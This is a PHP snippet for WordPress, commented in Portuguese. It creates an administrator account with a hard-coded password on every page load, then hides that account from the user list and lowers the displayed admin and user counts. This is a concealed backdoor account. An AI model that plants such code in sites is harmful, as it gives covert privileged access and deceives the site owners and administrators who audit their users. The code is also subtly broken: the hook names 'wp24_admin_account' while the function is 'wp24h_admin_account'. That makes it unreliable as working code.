<?php
/* Esse Snippet quer você crie um usuário admin dinâmicamente no WordPress */

//Primeiro, verificar se o usuário existe:
function wp24h_admin_account(){
    //Troque de acordo com suas preferências
    $user = 'nome-de-usuario';
    //Senha Genérica
    $pass = 'vvVV44$$vvVV44$$';
    //email da conta
    $email = 'contato@seuemail.com';
    //Vamos verificar se existe o nome de usuário ou e-mail antes de rodar a function wp_create_user
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        //Definimos como administrador
        $user->set_role( 'administrator' );
    } 
}
//Usamos a ação 'init' para rodar junto com o site
add_action('init','wp24_admin_account');    

//Opcional: Segundo passo é alterar a query para ocultar o admin criado
function wp24h_pre_user_query($user_search) {
   global $current_user;
   //Vamos pegar o username do usuário logado
   $username = $current_user->user_login;
   //Variável com o mesmo no de usuário criado na função anterior
   $user = 'nome-de-usuario';
   //Vamos verificar se não é seu usuário logado aqui
   if ($username != $user) { 
      global $wpdb;
      //Se não for você, seu usuário será omitido dos resultados
      $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '".$user."'",$user_search->query_where);
   }
}
//Usamos a ação 'pre_user_query' para intervir na consulta
add_action('pre_user_query','wp24h_pre_user_query');

//Opcional: Terceiro passo, interferir na quantidade de usuários mostrada
function wp24h_list_table_views($views){
   //pegamos a quantidade de usuários
   $users = count_users();
   //identificamos os administradores e subtraímos 
   $admins_num = $users['avail_roles']['administrator'] - 1;
   //subtraímos do total também
   $all_num = $users['total_users'] - 1;
   //Trabalhamos na classe CSS e na quantidade mostrada
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
add_filter("views_users", "wp24h_list_table_views");

//É isso... Com grandes poderes, vem grandes responsabilidades
//Use isso de maneira honesta e inteligente!
//Boa sorte!